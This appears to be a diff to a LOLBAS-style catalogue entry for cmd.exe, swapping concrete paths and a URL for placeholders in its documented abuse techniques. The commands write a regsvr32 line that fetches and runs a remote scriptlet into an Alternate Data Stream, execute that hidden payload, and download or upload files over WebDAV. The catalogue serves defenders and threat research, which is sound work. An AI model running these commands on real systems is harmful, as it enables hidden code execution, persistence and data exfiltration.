@@ -4,28 +4,28 @@ Description: The command-line interpreter in Windows
 Author: Ye Yint Min Thu Htut
 Created: 2019-06-26
 Commands:
-  - Command: cmd.exe /c echo regsvr32.exe ^/s ^/u ^/i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct ^scrobj.dll > fakefile.doc:payload.bat
+  - Command: cmd.exe /c echo regsvr32.exe ^/s ^/u ^/i:{REMOTEURL:.sct} ^scrobj.dll > {PATH}:payload.bat
     Description: Add content to an Alternate Data Stream (ADS).
     Usecase: Can be used to evade defensive countermeasures or to hide as a persistence mechanism
     Category: ADS
     Privileges: User
     MitreID: T1564.004
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
-  - Command: cmd.exe - < fakefile.doc:payload.bat
+  - Command: cmd.exe - < {PATH}:payload.bat
     Description: Execute payload.bat stored in an Alternate Data Stream (ADS).
     Usecase: Can be used to evade defensive countermeasures or to hide as a persistence mechanism
     Category: ADS
     Privileges: User
     MitreID: T1059.003
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
-  - Command: type \\webdav-server\folder\file.ext > C:\Path\file.ext
+  - Command: type {PATH_SMB} > {PATH_ABSOLUTE}
     Description: Downloads a specified file from a WebDAV server to the target file.
     Usecase: Download/copy a file from a WebDAV server
     Category: Download
     Privileges: User
     MitreID: T1105
     OperatingSystem: Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
-  - Command: type C:\Path\file.ext > \\webdav-server\folder\file.ext
+  - Command: type {PATH_ABSOLUTE} > {PATH_SMB}
     Description: Uploads a specified file to a WebDAV server.
     Usecase: Upload a file to a WebDAV server
     Category: Upload
